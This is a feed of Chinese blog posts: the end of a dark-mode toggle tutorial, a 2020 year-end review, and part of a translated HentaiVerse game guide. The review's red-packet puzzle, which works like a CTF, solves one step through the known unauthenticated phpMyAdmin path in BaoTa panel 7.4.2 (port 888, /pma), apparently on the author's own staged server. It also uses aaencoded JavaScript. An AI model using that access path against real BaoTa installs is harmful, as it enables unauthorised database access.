class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 